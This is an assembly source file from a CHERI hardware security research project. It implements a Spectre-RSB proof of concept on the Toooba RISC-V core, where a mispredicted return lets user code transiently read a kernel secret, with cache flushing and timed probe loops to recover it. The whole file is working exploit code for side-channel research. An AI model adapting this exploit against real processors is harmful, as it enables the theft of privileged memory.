/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"


.text

/*
Spectre-RSB-CHERI

It calls a function that fetches its return
address from the stack and jumps there. Therefore,
the Return Stack Buffer (RSB) does not hold the same
value as the stack. Toooba will predict a jump back
to the user code, but actually a jump inside the
kernel code should have been taken.

In simulation:
1st load: 0x0000000080040400
2nd load: 0x0000000080004400
*/

change_to_cap_mode:
  // set pcc flags such that capability encoding
  // mode is used
  // This is described in the CHERI Specification v7
  cspecialr ct3, pcc
  li t1, 1
  csetflags ct3, ct3, t1
#ifdef VCU_118
  li  t2, 0xc0000018
#else
  li  t2, 0x80000018
#endif
  csetoffset  ct3, ct3, t2
  cjr ct3

init_caps:

    /*
     * data capabilities
     */

#ifdef VCU_118
    // cs1 is a capability to [0xc0001000 - 0xc0002000]
    li  t2, 0xc0001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0xc0002000 - 0xc0003000]
    li  t2, 0xc0002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1

    // ct6 is a capability to [0xc0003000 - 0xc0004000]
    li  t2, 0xc0003000
    cfromptr ct6, ddc, t2
    li t1, 0x1000
    csetbounds ct6, ct6, t1

    // cs7 is a capability to [0xc0004000 - 0xc0005000]
    li  t2, 0xc0004000
    cfromptr cs7, ddc, t2
    li t1, 0x1000
    csetbounds cs7, cs7, t1
#else
    // cs1 is a capability to [0x80001000 - 0x80002000]
    li  t2, 0x80001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0x80002000 - 0x80003000]
    li  t2, 0x80002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1

    // ct6 is a capability to [0x80003000 - 0x80004000]
    li  t2, 0x80003000
    cfromptr ct6, ddc, t2
    li t1, 0x1000
    csetbounds ct6, ct6, t1

    // cs7 is a capability to [0x80004000 - 0x80005000]
    li  t2, 0x80004000
    cfromptr cs7, ddc, t2
    li t1, 0x1000
    csetbounds cs7, cs7, t1
#endif

    /*
     * code capabilities
     */

    // PCC for flush function
    cllc cs4, flush
    li t1, 0x100
    csetbounds cs4, cs4, t1

    // PCC for kernel function
    cllc cs5, kernel_funct
    li t1, 0x1000
    csetbounds cs5, cs5, t1

    // PCC for user function
    cllc cs6, user_funct
    li t2, 0x1000
    csetbounds cs6, cs6, t2

    // PCC for idle function
    cllc ct1, idle_funct
    li t2, 0x100
    csetbounds ct1, ct1, t2
    // store at cs2
    csc ct1, 0(cs2)

    // trap handler
    cllc ca7, trap_handler

spec_rsb_cheri:
    // jump to user function
    cjr cs6


flush:
    // flush entire cache
    
    // use ddc for that
    // set to memory address not used by
    // other sections
#ifdef VCU_118
    li t2, 0xc0060000
#else
    li t2, 0x80060000
#endif
    li t3, 0x400000
    add t3, t2, t3
    cfromptr ct1, ddc, t2
flush_loop:
    cld t0, 0(ct1)
    li a6, 1024
    cincoffset ct1, ct1, a6
    cgetaddr t0, ct1
    ble t0, t3, flush_loop

    // fence instruction
    fence rw, rw
    cret

trap_handler:
    // for time measurements
    HPM_M_READ_X (s11, 3)


probe:
#ifdef VCU_118
    li  t2, 0xc0004200
    li  t3, 0xc0070000
#else
    li  t2, 0x80004200
    li  t3, 0x80070000
#endif
    cfromptr ct2, ddc, t2
    cfromptr ct6, ddc, t3
    add t4, x0, x0
    addi t5, x0, 16
probe_loop:
    rdcycle t0
    cld t3, 0(ct2)
    rdcycle t1
    sub t1, t1, t0
    csd t1, 0(ct6)
    cincoffsetimm ct6, ct6, 8
    cincoffsetimm ct2, ct2, 64
    addi t4, t4, 1
    blt t4, t5, probe_loop
    nop
    nop

    // we expect 4097 + 2 loads to have happened
    // 4097 loads from the flush function
    // one architectural load in kernel_funct
    // two transient loads in user_funct, where
    // the latter one leaks the secret. HOWEVER
    // the first one will be served by a store buffer
    // and therefore not go to the L1 D Cache as confirmed
    // by the simulation output
    HPM_CAP_TEST(s10, s11, 4099)

/*
 * kernel code
 */

.section .kernel , "ax"

kernel_funct:

    // TODO: might be improvable
    // insert nops for alignment of
    // auipcc instruction
    nop
    nop
    // load new return address
    clc cra, 0(cs2)
    // load kernel pcc in ct6
    auipcc ct6, 0
    li t1, 0x200
    cincoffset ct6, ct6, t1
    li t1, 0x400
    // store secret
    csd t1, 0(ct6)
    // return
    cret

    .rept 0x20
    nop
    .endr


// function that the code actually returns to
idle_funct:
    // call trap_handler
    cjr ca7

/*
 * user code
 */

.section .user , "ax"

user_funct:

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    HPM_M_READ_X (s10, 3)

    // flush caches
    cjalr cra, cs4

    // do fence instruction
    fence rw, rw

    // jump to kernel function
    cjalr cra, cs5

    // access ct6
    cld t1, 0(ct6)
    // reveal secret
    cincoffset ct5, cs7, t1
    cld t1, 0(ct5)

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
